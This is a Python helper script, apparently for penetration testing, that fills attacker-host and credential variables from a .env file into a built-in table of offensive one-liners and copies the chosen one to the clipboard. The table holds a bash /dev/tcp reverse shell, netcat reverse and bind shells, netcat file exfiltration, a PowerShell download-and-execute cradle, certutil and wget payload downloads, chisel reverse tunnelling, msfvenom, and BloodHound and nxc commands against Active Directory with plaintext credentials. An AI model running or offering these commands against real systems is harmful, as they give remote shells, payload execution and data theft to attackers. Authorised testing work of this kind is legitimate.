#!/usr/bin/env python3

import argparse
import os
import re
from re import match
from subprocess import Popen, PIPE
from dotenv import load_dotenv
from pathlib import Path

commands = {
    "curl": "curl -OL http://$LHOST/$FILE",
    "wget": "wget http://$LHOST/$FILE",
    "bash": "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1",
    "http": "http://$LHOST/$FILE",
    "nc-bind": "mkfifo /tmp/f; nc -lvnp $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/",
    "nc-file": "nc -w 3 $LHOST $LPORT < $FILE",
    "nc-rev": "mkfifo /tmp/f; nc $LHOST $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/f",
    "ps-dl": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://$LHOST:80/$FILE','$FILE')\"",
    "ps-ex": "powershell \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:80/$FILE')\"",
    "ps-wget": "wget -OutFile $FILE http://$LHOST/$FILE",
    "ps-wr": "Invoke-WebRequest -OutFile $FILE http://$LHOST/$FILE",
    "certutil": "certutil -urlcache -split -f http://$LHOST/$FILE",
    "xfreerdp": 'xfreerdp3 /dynamic-resolution +clipboard /cert:ignore /v:$RHOST /u:"$DOMAIN\\$UN" /p:"$PW" &',
    "nxc-ldap": 'nxc ldap $FQDN -u "$UN" -p "$PW"',
    "bloodhound": "bloodhound-ce-python -u $UN -p $PW -dc $DC -d $DOMAIN -ns $NS --collectionmethod ALL",
    "msfvenom": "msfvenom LHOST=$LHOST LPORT=$LPORT",
    "chisel-server": "chisel server -p 9000 --socks5 --reverse &",
    "chisel-client": "./chisel client $LHOST:9000 R:1080:socks &",
}

def replace(input, vars):
    output = input
    for key in vars.keys():
        output = output.replace(key, vars[key])
    return output


def get_command():
    print("Available commands:")
    for i, key in enumerate(commands.keys()):
        print(f"{i: >2}) {key : <13} : {commands[key]}")
    choice = input("\nChoose a command to play: ")
    if choice == "":
        return
    cmd = list(commands.keys())[int(choice)]
    return cmd

def get_file():
    home = Path.home() / "transfer"
    files = sorted([p.name for p in home.iterdir()], key=str.lower)
    for i, file in enumerate(files):
        print(f"{i : >2}) {file}")
    choice = input("\nChoose a file to transfer: ")
    if choice == "":
        return ""
    return files[int(choice)]


def load_vars():
    load_dotenv("./.env")
    list = (
        "LHOST",
        "LPORT",
        "RHOST",
        "DOMAIN",
        "DC",
        "NS",
        "FQDN",
        "UN",
        "PW",
    )
    vars = {}
    for var in list:
        vars[f"${var}"] = os.environ.get(var, "")
    if args.file != "":
        vars["$FILE"] = args.file
    return vars


def main(args):

    output = ""
    cmd = args.cmd

    if args.file == True:
        args.file = get_file()

    vars = load_vars()
    
    for key, value in commands.items():
        commands[key] = replace(value, vars)   

    if cmd == "":
        cmd = get_command()

    if cmd in commands:
        output = commands[cmd]
        if args.proxychains:
            output = f"proxychains {output}"
        p1 = Popen(["xclip", "-selection", "clipboard", "-f"], stdin=PIPE)
        p1.communicate(input=(output.encode()))
    else:
        print("Command not found")


if __name__ == "__main__":
    parser = argparse.ArgumentParser("Command player")
    parser.add_argument("-f", default="", dest="file", action="store_true", help="File name")
    parser.add_argument("-F", "--file", default="", dest="file", action="store", type=str, help="File name")
    parser.add_argument("-u", "--user", default="", dest="user", action="store", type=str, help="Username")
    parser.add_argument("-p", "--password", default="", dest="password", action="store", type=str, help="Password")
    parser.add_argument("-pc", "--proxychains", action="store_true", default=False, help="Use proxychains")
    parser.add_argument("cmd", default="", nargs="?", type=str, help="Choose a command to play")
    args = parser.parse_args()
    main(args)
